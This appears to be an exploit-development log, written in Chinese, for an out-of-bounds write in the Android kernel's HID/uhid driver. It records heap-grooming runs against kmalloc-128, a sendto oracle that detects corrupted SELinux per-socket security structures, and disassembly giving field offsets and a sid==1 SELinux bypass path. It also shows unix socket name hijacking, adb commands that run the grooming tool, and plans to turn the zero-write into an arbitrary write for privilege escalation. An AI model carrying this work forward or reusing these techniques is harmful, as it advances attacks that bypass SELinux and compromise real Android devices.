# hid 越界写 —— 第三轮: 触及 SELinux 状态 (2026-09-21 22:4x~23:0x)

## 0. 一句话
用 `sendto` 甄别把"受害者是谁"分开了: 除了 `unix_address`, **越界写确实打到了 socket 的
SELinux `sk_security_struct`** —— 被打中的 socket 从"正常返回 ECONNREFUSED"变成
"SELinux 判定失败"。字段偏移也用三个钩子的反汇编钉死了。

## 1. 甄别方法 (可复现)
健康 socket 上 `sendto(fd, "x", 1, MSG_DONTWAIT, <不存在的抽象名>, ...)`:
- 先过 `security_socket_sendmsg` ⇒ 通过
- 再查名字 ⇒ 找不到 ⇒ **ECONNREFUSED(111)**
若该 socket 的 `sksec->sid` 被清成 0(非法 SID) ⇒ **第一步就失败** ⇒ EACCES/EINVAL
⇒ 两者 errno 完全不同, 天然区分 ✓ 且不产生任何队列压力(没有真的发出去)

工具: `uhid_groom7 ... <prefill> <hold> <scan>` (第 11 个参数 scan=1 打开甄别, 每发抽样 1/4)

## 2. 实测
| 运行 | 配置 | addr 丢失 | SELinux 异常 |
|---|---|---|---|
| 对照 pwn=0 | 4 发, prefill 2000, scan=1 | 0 | **0 / 2672 个 socket 全 ECONNREFUSED** ✓ 零误报 |
| 实验 pwn=1 | 24 发, prefill 4000, scan=1 | 5 (shot16 时) | **1 (shot16 出现)** ★★★ |
| 实验重复 | 24 发, 同配置 | — | 本次第 1~3 发即崩(方差) |
- ⇒ **越界写可达对象包含 SELinux 的每-socket 安全结构**, 这是"能改安全状态"的直接证据
- 崩的方差很大(有时 24 发全过, 有时第 1 发就崩): 根因仍是"邻居是别的活对象"

## 3. ★ 字段偏移: 三个钩子互相印证 (vmlinux.elf 反汇编)
| 函数 | 地址 | 关键指令 | 结论 |
|---|---|---|---|
| `selinux_sk_alloc_security` | 0xffffffc0107aa6c8 | `mov w2,#0x10` / `str x9,[x8]`(0x300000003) / `strh w10,[x8,#0x8]`(0xf) | **blob = 16 字节**, 初值 sid=3, peer_sid=3, sclass=15 |
| `selinux_sk_getsecid` | 0xffffffc0107aa784 | `ldr x8,[x0,#0x298]` → `ldr w8,[x8]` → `str w8,[x1]` | **`sid` 在偏移 0**; `sk->sk_security` 在 struct sock **偏移 0x298**; sk==NULL 时返回 8 |
| `selinux_sock_graft` | 0xffffffc0107aa7a4 | `ldr x8,[x0,#0x298]` … `strh w9,[x8,#0x8]` | **`sclass`(u16) 在偏移 8** |

⇒ 布局确定: **`struct sk_security_struct { u32 sid; u32 peer_sid; u16 sclass; }` (16 字节, kmalloc-128)**

## 4. ★★ 最重要的发现: sendmsg 里有 "sid==1 直接放行" 的快路径
`selinux_socket_sendmsg` @0xffffffc0107a9b6c:
```
ldr x9, [x0, #0x18]      ; sk = sock->sk
ldr x8, [x9, #0x298]     ; sksec = sk->sk_security
ldr w10, [x8]            ; w10 = sksec->sid
cmp w10, #0x1
b.ne medi_path
mov w0, wzr              ; ★ sid == 1 (SECINITSID_KERNEL) ⇒ 直接 return 0 = 放行, 不查策略
b   out
medi_path: ... avc_has_perm(...)
```
⇒ **如果能把某个 socket 的 `sid` 写成 1, 这个 socket 的 sendmsg 就完全绕过 SELinux。**
但我们的 memset **只能写 0**, 而 sid=0 是非法 SID ⇒ 策略查不到 ⇒ 一律拒绝 ⇒ **方向是 DoS, 不是提权**。

**这就是当前原语的根本短板: 只能写零。** 下一步真正有价值的是把"写零"变成"写任意值",
或者找到"清 0 即放宽"的字段(例: 某个 `permissive`/`checked` 标志、某个"上限"字段)。

## 5. 顺带确认的两件事
- `selinux_sk_getsecid` 在 `sk == NULL` 时返回 **8**(= SECINITSID_KERNEL 在本策略里的编号),
  而 sendmsg 里比较的是 **1** —— 两者不是同一个常量, 说明 sendmsg 里的 1 是另一路语义
  (需要在真机上用 `sid` 的实际取值侧面确认, 但"相等即放行"这一点是确定的)
- `sk->sk_security` 在 struct sock 偏移 **0x298**; `struct sock` 是专用 cache(不在 kmalloc-128),
  所以我们不能通过打 sk_security 指针来搞事, 只能打它指向的 16 字节 blob

## 6. 复现命令
```
adb push C:/qemu_test/uhid_groom7 /data/local/tmp/ && adb shell chmod 755 /data/local/tmp/uhid_groom7
# 对照(应: addr丢=0, SELinux坏=0, 全 ECONNREFUSED)
adb shell 'cd /data/local/tmp && ./uhid_groom7 4 4 40 128 20 136 0 100 2000 0 1'
# 实验(期望出现 SELinux坏>=1; 崩溃概率较高, 输出是流式的, 崩前数据仍可读)
adb shell 'cd /data/local/tmp && ./uhid_groom7 4 24 40 128 20 136 1 100 4000 0 1'
```

## 8. ★★★ 收尾: 一次跑完的完整账 (10 发, 全程不崩)
```
[result] addr: 基线 4000 → 5677  最大丢失 3 (首次@#2)
[scan ] 全扫 sendto 5680 个: 正常(ECONNREFUSED)=5676  异常: EINVAL=4 EACCES=0 其它=0
[scan ] 打中 SELinux sk_security_struct 的 socket 数 = 4  ⇒ ★★★ 原语已触及 SELinux 状态
[take ] 全扫 5680 个名字: 可被抢占(addr.len 被清零) = 3  ⇒ ★★★ 拿到名字抢占能力
```
- **一次 10 发里同时打中两类对象**: 3 个 `unix_address` + 4 个 `sk_security_struct` (共 7 个 kmalloc-128 对象)
- **逐 socket 精确定位**: 被清零的 addr 索引 = 4206 / 4882 / 5390, 由两个**互相独立**的 oracle 交叉验证:
  ① `/proc/net/unix` 里名字消失(缺失索引) ② 用新 socket 去 `bind` 同名成功(名字已变"空闲")
- 异常 errno 是 **EINVAL** 而不是 EACCES ⇒ 说明是 **sid=0 这个非法 SID 让策略查找失败**,
  而不是"策略拒绝" —— 与"清 0 是 DoS 方向"的判断一致
- 计数口径修正: 早期版本把 sendto 异常写成**累加**计数, 同一 socket 会被重复计入(所以出现过 7 这种虚高);
  现在每次扫描独立计数 ⇒ 上面这组数字是可信的

## 9. 两处认知修正 (来自 unix_getname 的反汇编, 0xffffffc01133bcb0)
```
ldr x19,[x0,#0x18]        ; sk = sock->sk
add x0, x19, #0x80        ; &u->addr        ← u->addr 在 unix_sock 偏移 0x80
... refcount_inc(u->addr) (ldxr/stxr 内联循环, refcnt 在 addr 偏移 0)
ldr w21,[x8,#0x4]         ; addr->len       ← len 在偏移 4 ✓
add x1,  x8,#0xc          ; addr->name->sun_path  ← ★ name 在偏移 0xc = 12 (不是 8!)
sxtw x2,  w21             ; ★ 拷贝长度 = 符号扩展(len), **没有 len-2**
bl  memcpy                ; memcpy(用户缓冲区, addr+0xc, len)
```
1. **`struct unix_address` = `{refcnt@0, len@4, hash@8, name@0xc}`** (基础 12 字节, 之前一直以为是 8)。
   ⇒ 我们 9 字节的越界写实际清零 = refcnt(0-3) + len(4-7) + hash 的**首字节**(8) ⇒
   (a) 从 /proc/net/unix 消失  (b) 按名字查不到  (c) 名字变空闲可被抢占  (d) 名字字节本身没动
2. **`getsockname` 在 len=0 的 socket 上致命的原因不是 memcpy 尺寸**:
   memcpy 长度是 `sxtw(len)` = 0 ⇒ **拷贝 0 字节, 完全安全**。
   真正的原因是同一函数里**内联了 `refcount_inc(&addr->refcnt)`**, refcnt 已被清零 ⇒
   触发 `refcount_t: addition on 0; use-after-free` 的 **WARN** ⇒ Android `panic_on_warn=1` ⇒ panic。
   ⇒ 结论不变(仍不能用 getsockname 回读), 但理由是 refcount 而不是 memcpy —— 这个区别很重要:
   只要**不碰 refcount**, 其它基于 len 的接口(如 bind 抢占)是安全的 ✓

## 10. 下一步
1. **把"写零"升级成"写任意值"**: 现在越界写的内容固定是 memset 的 0。任何"写非零"的途径
   (例如让 `hid_field_extract` 的解析结果回写到别的缓冲、或换一个能产生非零填充的内核路径)
   都会立刻把 sid→1 的绕过大路打通。
2. **找"清 0 即放宽"的 kmalloc-128 字段**: 已知可达对象 = `unix_address` / `sk_security_struct` /
   `hid_field` / 系统小对象(pid、task_delay_info 等)。逐个试: `pid.level`、各种 flags/flags2、
   各种上限字段。
3. **降崩溃率**: 崩的根因是"漏洞缓冲所在页还有别人的活对象(尤其 probe 自己分配的 hid_field)"。
   可行方向: ① 让 probe 的 hid_field 与 buffer 分处两页(burst1 自适应) ② 换 kmalloc-256
   (n1=248) 避开全系统最忙的 kmalloc-128 ③ 用更小的 rcnt(只清 2~4 字节)减少对别人的破坏。
4. **OOB 读的可用性**: `hid_input_field` 会用 `rcnt` 个字节去解析 `data`(只有 128 字节),
   即越界**读** (rcnt-128) 字节, 结果被送进 input 子系统。若有办法读到这些 input 事件,
   就是一个内核内存泄露原语(当前 /dev/input/event* 不可达)。
